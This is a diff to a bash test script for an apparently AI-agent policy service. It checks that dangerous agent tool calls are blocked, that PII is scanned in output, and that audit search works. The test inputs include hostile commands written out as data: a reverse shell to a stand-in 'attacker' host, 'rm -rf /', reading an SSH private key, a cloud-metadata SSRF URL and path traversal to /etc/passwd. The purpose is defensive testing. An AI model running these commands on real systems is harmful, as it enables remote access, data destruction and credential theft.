@@ -213,6 +213,114 @@ fi
 echo ""
 
 # ============================================================
+# Step 3b: Dangerous command policies (migration 059)
+# ============================================================
+echo "--- Step 3b: Dangerous command blocking ---"
+
+# Reverse shell
+RESPONSE=$(curl -s -w "\n%{http_code}" \
+    -H "Authorization: Basic $AUTH" -H "Content-Type: application/json" \
+    -d '{"connector_type": "openclaw.exec", "statement": "bash -i >& /dev/tcp/attacker/4444 0>&1", "operation": "execute"}' \
+    "$AXONFLOW_ENDPOINT/api/v1/mcp/check-input")
+STATUS=$(echo "$RESPONSE" | tail -1)
+assert_check "Reverse shell blocked (HTTP $STATUS)" "$([ "$STATUS" = "403" ] && echo true || echo false)"
+
+# Destructive filesystem
+RESPONSE=$(curl -s -w "\n%{http_code}" \
+    -H "Authorization: Basic $AUTH" -H "Content-Type: application/json" \
+    -d '{"connector_type": "openclaw.exec", "statement": "rm -rf /", "operation": "execute"}' \
+    "$AXONFLOW_ENDPOINT/api/v1/mcp/check-input")
+STATUS=$(echo "$RESPONSE" | tail -1)
+assert_check "rm -rf / blocked (HTTP $STATUS)" "$([ "$STATUS" = "403" ] && echo true || echo false)"
+
+# Credential access
+RESPONSE=$(curl -s -w "\n%{http_code}" \
+    -H "Authorization: Basic $AUTH" -H "Content-Type: application/json" \
+    -d '{"connector_type": "openclaw.exec", "statement": "cat ~/.ssh/id_rsa", "operation": "execute"}' \
+    "$AXONFLOW_ENDPOINT/api/v1/mcp/check-input")
+STATUS=$(echo "$RESPONSE" | tail -1)
+assert_check "Credential access blocked (HTTP $STATUS)" "$([ "$STATUS" = "403" ] && echo true || echo false)"
+
+# SSRF — cloud metadata endpoint
+RESPONSE=$(curl -s -w "\n%{http_code}" \
+    -H "Authorization: Basic $AUTH" -H "Content-Type: application/json" \
+    -d '{"connector_type": "openclaw.web_fetch", "statement": "http://169.254.169.254/latest/meta-data/", "operation": "execute"}' \
+    "$AXONFLOW_ENDPOINT/api/v1/mcp/check-input")
+STATUS=$(echo "$RESPONSE" | tail -1)
+assert_check "Cloud metadata SSRF blocked (HTTP $STATUS)" "$([ "$STATUS" = "403" ] && echo true || echo false)"
+
+# Path traversal
+RESPONSE=$(curl -s -w "\n%{http_code}" \
+    -H "Authorization: Basic $AUTH" -H "Content-Type: application/json" \
+    -d '{"connector_type": "openclaw.exec", "statement": "cat ../../etc/passwd", "operation": "execute"}' \
+    "$AXONFLOW_ENDPOINT/api/v1/mcp/check-input")
+STATUS=$(echo "$RESPONSE" | tail -1)
+assert_check "Path traversal blocked (HTTP $STATUS)" "$([ "$STATUS" = "403" ] && echo true || echo false)"
+
+# Safe command — should NOT be blocked
+RESPONSE=$(curl -s -w "\n%{http_code}" \
+    -H "Authorization: Basic $AUTH" -H "Content-Type: application/json" \
+    -d '{"connector_type": "openclaw.exec", "statement": "echo hello world", "operation": "execute"}' \
+    "$AXONFLOW_ENDPOINT/api/v1/mcp/check-input")
+STATUS=$(echo "$RESPONSE" | tail -1)
+assert_check "Safe command allowed (HTTP $STATUS)" "$([ "$STATUS" = "200" ] && echo true || echo false)"
+echo ""
+
+# ============================================================
+# Step 3c: PII detection in output
+# ============================================================
+echo "--- Step 3c: PII detection ---"
+
+# SSN in output
+RESPONSE=$(curl -s -w "\n%{http_code}" \
+    -H "Authorization: Basic $AUTH" -H "Content-Type: application/json" \
+    -d '{"connector_type": "openclaw.message_sending", "message": "Customer SSN: 123-45-6789"}' \
+    "$AXONFLOW_ENDPOINT/api/v1/mcp/check-output")
+STATUS=$(echo "$RESPONSE" | tail -1)
+BODY=$(echo "$RESPONSE" | sed '$d')
+assert_check "PII output scan returns 200 (HTTP $STATUS)" "$([ "$STATUS" = "200" ] && echo true || echo false)"
+assert_check "PII policies evaluated" "$(echo "$BODY" | grep -q "policies_evaluated" && echo true || echo false)"
+
+# Credit card in output
+RESPONSE=$(curl -s -w "\n%{http_code}" \
+    -H "Authorization: Basic $AUTH" -H "Content-Type: application/json" \
+    -d '{"connector_type": "openclaw.message_sending", "message": "Card: 4111-1111-1111-1111"}' \
+    "$AXONFLOW_ENDPOINT/api/v1/mcp/check-output")
+STATUS=$(echo "$RESPONSE" | tail -1)
+BODY=$(echo "$RESPONSE" | sed '$d')
+assert_check "Credit card PII scan returns 200 (HTTP $STATUS)" "$([ "$STATUS" = "200" ] && echo true || echo false)"
+
+# Clean output — no PII
+RESPONSE=$(curl -s -w "\n%{http_code}" \
+    -H "Authorization: Basic $AUTH" -H "Content-Type: application/json" \
+    -d '{"connector_type": "openclaw.exec", "message": "Build succeeded. 42 tests passed."}' \
+    "$AXONFLOW_ENDPOINT/api/v1/mcp/check-output")
+STATUS=$(echo "$RESPONSE" | tail -1)
+assert_check "Clean output allowed (HTTP $STATUS)" "$([ "$STATUS" = "200" ] && echo true || echo false)"
+echo ""
+
+# ============================================================
+# Step 3d: Audit search (searchAuditEvents)
+# ============================================================
+echo "--- Step 3d: Audit search ---"
+
+# Search recent audit events
+SEARCH_RESPONSE=$(curl -s -w "\n%{http_code}" \
+    -H "Authorization: Basic $AUTH" -H "Content-Type: application/json" \
+    -H "X-Tenant-ID: $AXONFLOW_CLIENT_ID" \
+    -d "{\"start_time\": \"$(date -u -v-1H '+%Y-%m-%dT%H:%M:%SZ' 2>/dev/null || date -u -d '1 hour ago' '+%Y-%m-%dT%H:%M:%SZ')\", \"end_time\": \"$(date -u '+%Y-%m-%dT%H:%M:%SZ')\", \"limit\": 5}" \
+    "$AXONFLOW_ENDPOINT/api/v1/audit/search")
+SEARCH_STATUS=$(echo "$SEARCH_RESPONSE" | tail -1)
+
+assert_check "Audit search returns 200 (HTTP $SEARCH_STATUS)" "$([ "$SEARCH_STATUS" = "200" ] && echo true || echo false)"
+
+if [ "$SEARCH_STATUS" = "200" ]; then
+    SEARCH_BODY=$(echo "$SEARCH_RESPONSE" | sed '$d')
+    assert_check "Audit search returns entries array" "$(echo "$SEARCH_BODY" | grep -q "entries" && echo true || echo false)"
+fi
+echo ""
+
+# ============================================================
 # Step 4: Live agent test (requires LLM key)
 # ============================================================
 if [ "$HAS_LLM" = "true" ]; then
